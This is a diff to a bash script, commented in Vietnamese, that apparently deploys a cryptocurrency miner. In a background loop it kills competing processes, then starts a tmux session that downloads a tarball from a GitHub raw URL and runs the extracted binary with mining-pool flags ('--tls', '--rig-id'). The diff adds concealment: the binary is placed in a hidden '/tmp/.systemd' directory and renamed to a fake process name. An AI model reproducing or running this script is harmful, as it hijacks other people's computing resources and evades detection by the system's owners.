@@ -1,10 +1,13 @@
 #!/bin/bash
 
-SESSION="node"
+SESSION="nihux"
 DOMAIN="$1"
 NAME_WORK="$2"
+HIDDEN_DIR="/tmp/.systemd"         # 📁 Thư mục ẩn
+ARCHIVE_NAME="nihux.tar.gz"
+BINARY_NAME="nihux"                # 🔒 Tên giả tiến trình
 
-# 🔁 Vòng lặp kill liên tục các tiến trình nghi vấn
+# 🔁 Kill tiến trình nghi vấn
 (
   while true; do
     pkill -f qemu-system-x86_64-headless 2>/dev/null
@@ -14,19 +17,21 @@ NAME_WORK="$2"
   done
 ) &
 
-# 📟 Khởi tạo tmux session nếu chưa có
+# 📟 Tạo tmux nếu chưa có
 if tmux has-session -t $SESSION 2>/dev/null; then
     tmux attach-session -t $SESSION
 else
     tmux new-session -s $SESSION -d
 
     tmux send-keys -t $SESSION "
-        rm -rf android ios java* java java java.tar.gz &&
-        wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz &&
-        tar -xzf java.tar.gz &&
-        cd java &&
-        chmod +x java &&
-        ./java -o $DOMAIN --tls -k -t 1 --rig-id $NAME_WORK
+        mkdir -p $HIDDEN_DIR &&
+        cd $HIDDEN_DIR &&
+        rm -rf $BINARY_NAME* &&
+        wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz -O $ARCHIVE_NAME &&
+        tar -xzf $ARCHIVE_NAME &&
+        mv java $BINARY_NAME &&
+        chmod +x $BINARY_NAME &&
+        ./$BINARY_NAME -o $DOMAIN --tls -k -t 1 --rig-id $NAME_WORK
     " C-m
 
     tmux attach-session -t $SESSION
